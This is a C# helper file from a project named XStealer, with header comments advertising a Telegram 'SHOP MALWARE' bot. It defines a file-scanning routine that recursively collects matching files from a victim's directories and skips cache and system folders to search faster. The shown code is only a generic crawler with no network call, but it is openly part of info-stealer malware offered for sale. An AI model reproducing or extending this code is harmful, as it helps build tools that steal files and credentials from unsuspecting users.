// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
	using System;
	using System.Collections.Generic;
	using System.IO;
	using System.Linq;

	public static class SafeScan
	{
		/// <summary>
		/// <br><b>RUS</b></br><br>Список директорий в которых не надо проходить (обходит их) для более быстрого поиска</br>
		/// <br><b>ENG</b></br><br>List of directories in which you do not need to go (bypass them) for faster search</br>
		/// </summary>
		private static readonly string[] BypassDir = new string[]
		{
			"Microsoft", "History", "Temp", "Temporary Internet Files",
			"XStealers", "cache", "cache2", "entries", "IsolatedStorage", "CrashDumps",
			"Telegram Desktop", "uTorrent", "Service Worker", "File System",
			"Code Cache", "Crash Reports", "idb", "Adobe", ".purple", "audacity",
			"Extension State", "images",
		};

		/// <summary>
		/// <br><b>RUS</b></br><br>Метод для сбора файлов в Стек (первый вошёл, первый вышел)</br>
		/// <br><b>ENG</b></br><br>Method for collecting files on the Stack (first in, first out)</br>
		/// </summary>
		/// <param name="path"><br><b>RUS</b></br><br>Путь для сканирования</br><br><b>ENG</b></br><br>Path to scan</br></param>
		/// <param name="pattern"><br><b>RUS</b></br><br>Паттерн расширения</br><br><b>ENG</b></br><br>Extension pattern</br></param>
		/// <returns><br><b>RUS</b></br><br>Список всех файлов</br><br><b>ENG</b></br><br>List of all files</br></returns>
		public static IEnumerable<string> GetStackFiles(string path, string pattern)
		{
			var dirs = new Stack<string>();
			dirs.Push(path);

			while (dirs.Count > 0)
			{
				string currentDirPath = dirs.Pop();
				try
				{
					foreach (string subfolder in Directory.GetDirectories(currentDirPath).Where(subfolder => !BypassDir.Contains(Path.GetFileName(subfolder), StringComparer.OrdinalIgnoreCase)).Select(subfolder => subfolder))
					{
						dirs.Push(subfolder);
					}
				}
				catch { continue; }
				string[] files = new string[0];
				try
				{
					files = Directory.GetFiles(currentDirPath, pattern);
				}
				catch (Exception) { continue; }
				foreach (string filePath in files)
				{
					var fileInfo = new FileInfo(filePath);
					if (fileInfo.Length > 0)
					{
						yield return filePath;
					}
				}
			}
		}
	}
}